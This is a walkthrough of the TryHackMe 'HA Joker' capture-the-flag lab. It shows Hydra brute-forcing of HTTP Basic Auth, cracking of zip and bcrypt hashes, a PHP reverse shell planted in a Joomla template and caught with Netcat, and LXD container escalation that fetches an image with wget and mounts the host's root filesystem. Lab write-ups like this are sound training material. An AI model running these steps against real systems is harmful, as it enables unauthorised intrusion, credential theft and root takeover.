# Walkthrough: TryHackMe - HA Joker CTF
## Reconnaissance & Web Initial Access
## Part 1: Reconnaissance & Service Discovery
### 1. Network Scanning (Nmap)
An Nmap service scan was performed against target IP ```10.48.182.61``` to identify open ports and running services:
```bash
nmap -sV -sC -p- 10.48.182.61
```
Key Findings:
- Port 22/tcp: Open — OpenSSH 8.2p1 (Ubuntu)
- Port 80/tcp: Open — Apache httpd 2.4.41 (Ubuntu)
- Port 8080/tcp: Open — Apache httpd 2.4.41 (HTTP Basic Authentication required)

### 2. Port 80 Web Enumeration
Visiting ```[http://10.48.182.61](http://10.48.182.61)``` presented a static landing page displaying a Joker image. Directory fuzzing was initiated using Gobuster:
```bash
gobuster dir -u http://10.48.182.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x .txt
```
Discovered Paths:
- /secret.txt (Status: 200)

Navigating to ```[http://10.48.182.61/secret.txt](http://10.48.182.61/secret.txt)``` revealed dialogue between Batman and Joker:
"Batman hits Joker.
```bash
Joker: "Bats you may be a rock but you won't break me." (Laughs!)
Batman: "I will break you with this rock. You made a mistake now."
Joker: "This is one of your 100 poor jokes, when will you get a sense of humor bats! You are dumb as a rock."
Joker: "HA! HA! HA! HA! HA! HA! HA! HA! HA! HA!"
```
Hint Extraction:
The dialogue explicitly references ```"100 poor jokes"``` and ```"rock"``` (indicating ```rockyou.txt```), pointing toward a potential HTTP Basic Authentication attack on port 8080 using the username ```joker```.

## Part 2: Port 8080 HTTP Basic Auth Crack & CMS Discovery
### 3. HTTP Basic Authentication Brute Force (Hydra)
Accessing ```[http://10.48.182.61:8080](http://10.48.182.61:8080)``` triggered an HTTP 401 Unauthorized prompt (```Basic realm=Please enter the password.```).
Using Hydra, a brute-force attack was launched against the HTTP GET endpoint with username ```joker``` and the ```rockyou.txt``` wordlist:
```bash
hydra -l joker -P /usr/share/wordlists/rockyou.txt -f 10.48.182.61 -s 8080 http-get
```
Credentials Obtained:
- Username: joker
- Password: hannah

### 4. Authenticated Directory Enumeration
Authenticating to port 8080 with ```joker:hannah``` loaded a Joomla CMS site. Authenticated directory fuzzing was executed using Gobuster:
```bash
gobuster dir -u http://10.48.182.61:8080/ -w /usr/share/wordlists/dirb/common.txt -U joker -P hannah
```
Discovered Joomla Endpoints:
- ```/administrator/``` (Status: 301) — Joomla Administrator Login Portal
- ```/backup``` (Status: 200, Size: ~12 MB) — Compressed archive/backup file

---

## Backup Extraction, Database Analysis & Admin Auth
## Part 1: Backup Archive Cracking & Extraction
### 1. Web Vulnerability Scanning & Backup Discovery
Running Nikto against port 8080 confirmed the presence of a compressed backup archive:
```bash
nikto -h http://10.48.182.61:8080/ -id joker:hannah
```
Key Discovery:
- ```/backup.zip``` was identified on the web root.

### 2. Cracking Password-Protected Archive
Attempting to extract ```backup.zip``` directly failed due to password protection. Using zip2john, the archive hash was extracted and cracked using John the Ripper:
```bash
zip2john backup.zip > joker.hash
john joker.hash
```
Cracked Password:
- Archive Password: ```hannah```

## Part 2: Database Dumping & Admin Password Cracking
### 3. Extracting and Inspecting Joomla Database Dump
Unzipping ```backup.zip``` with password ```hannah``` revealed two main directories: ```/db/``` and ```/site/```. Inside ```/db/joomladb.sql```, the SQL dump was inspected for Administrator credentials.
Extracted User Record (```cc1gr_users table```):
```bash
INSERT INTO `cc1gr_users` VALUES (547, 'Super Duper User', 'admin', 'admin@example.com', '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG', ...);
```
- Username: admin
- Bcrypt Hash: $2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG

### 4. Cracking Administrator Password Hash
The extracted Bcrypt hash was saved to ```pass.txt``` and submitted to John the Ripper:
```bash
echo '$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG' > pass.txt
john pass.txt
```
Cracked Credentials:
- Username: ```admin```
- Password: ```abcd1234```

---

## CMS Exploitation, Initial Access & LXD Privilege Escalation
### 1. Joomla Admin Authentication & Template Code Injection
### a. CMS Authentication:
- Navigated to ```[http://10.48.182.61:8080/administrator/index.php](http://10.48.182.61:8080/administrator/index.php)```.
- Logged in using cracked credentials: ```admin``` : ```abcd1234```.

### b. Template Customization:
- Navigated to Extensions $\rightarrow$ Templates $\rightarrow$ Templates.
- Selected Beez3 Details and Files to customize.
- Opened ```index.php``` for editing.

### c. Payload Injection:
- Replaced the standard ```index.php``` template logic with a custom PHP Reverse Shell payload targeting the listener host (```192.168.135.130:443```).
- Clicked Save.

##2. Triggering Payload & Catching Initial Access
### 1. Listener Setup:
- Started a Netcat listener on the attack machine:
```bash
nc -lvnp 443
```
### 2. Payload Execution:
- Triggered ```index.php``` execution by clicking Template Preview (or visiting the main site path utilizing the Beez3 template).

### 3. Reverse Shell Connection Established:
- Connection received on listener from target 10.48.182.61:
```bash
connect to [192.168.135.130] from (UNKNOWN) [10.48.182.61] 51526
Linux ip-10-48-182-61 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64
```
### 4. Initial Context & Group Membership Enumeration:
```bash
id
```
Output:
```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data),115(lxd)
```
Key Privilege Escalation Vector: User www-data is a member of the lxd group (```gid=115(lxd)```).

### 3. Privilege Escalation Vector: LXD Container Mounting
Members of the local ```lxd``` group can create and configure LXD containers with arbitrary host filesystem mounts, granting root-level file access to the host system.
Escalation Steps:
### 1. Build Alpine Image (Attacker Machine):
```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
sudo ./build-alpine
```
Generates ```alpine-v3.10-x86_64-20191008_1227.tar.gz```.

### 2. Transfer Image to Target:
- Attacker: python3 -m http.server 8000
- Target (/tmp):
```bash
cd /tmp
wget http://192.168.135.130:8000/alpine-v3.10-x86_64-20191008_1227.tar.gz
```
### 3. Import and Initialize Container (Target):
```bash
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc init myimage privesc -c security.privileged=true
```
### 4. Mount Host Root Filesystem:
```bash
lxc config device add privesc mydevice disk source=/ path=/mnt/root recursive=true
```
### 5. Start Container & Obtain Root Shell:
```bash
lxc start privesc
lxc exec privesc /bin/sh
```
### 6. Access Host File System:
- Host root partition is accessible at ```/mnt/root/```.
- Root flag located at ```/mnt/root/root/root.txt```.

### 4. Privilege Escalation via LXD & Root Flag Extraction
### Phase 1: Local Image Transfer & Environment Setup
### a. Host-Side Image Hosting:
- Navigated to the ```lxd-alpine-builder``` directory on the attacker machine (```192.168.135.130```).
- Hosted the compiled Alpine Linux image (```alpine-v3.13-x86_64-20210218_0139.tar.gz```) using a local HTTP server:
```bash
python3 -m http.server 8001
```
### b. Fetching Image on Target:
- Switched to the writeable ```/tmp``` directory on the target machine (```10.48.182.61```) and downloaded the image:
```bash
cd /tmp
wget http://192.168.135.130:8001/alpine-v3.13-x86_64-20210218_0139.tar.gz
```
### c. LXD Path & Socket Configuration:
- Configured necessary environment variables to interface directly with the LXD daemon via the snap binary path:
```bash
export LXD_DIR=/var/snap/lxd/common/lxd
alias lxc='/snap/lxd/current/bin/lxc'
```
### Phase 2: LXD Container Mounting & Execution
### a. Image Import & Verification:
- Imported the local tarball as a new LXD image with the alias ```myimage```:
```bash
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
```
- Verified successful import via ```lxc image list```.
### b. Privileged Container Initialization:
- Initialized a privileged LXD container named ignite using the imported image:
```bash
lxc init myimage ignite -c security.privileged=true
```
### c. Mounting Host Partition:
- Added the host target filesystem (```/```) to the container at ```/mnt/root```:
```bash
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
```
### d. Starting Container & Spawning Interactive Shell:
- Started the container and executed an interactive ```/bin/sh``` shell inside it:
```bash
lxc start ignite
lxc exec ignite /bin/sh
```
### Phase 3: Root Access & Flag Retrieval
### a. Container Privilege Verification:
- Executed ```whoami``` inside the container session:
```bash
whoami
# Output: root
```
### b. Host Root Directory Access:
- Navigated to the mounted host filesystem path:
```bash
cd /mnt/root/root
ls -la
```
### c. Reading the Final Flag:
```bash
cat final.txt
```
Output / Flag Banner:
```bash
_  ____  _  _______ ____  
  | |/ __ \| |/ / ____/  _ \
```
_  | | |  | | ' /|  | | |) |
| || | || | . | ||  _ <
_/ _/||_____|| _\

!! Congrats you have finished this task !!


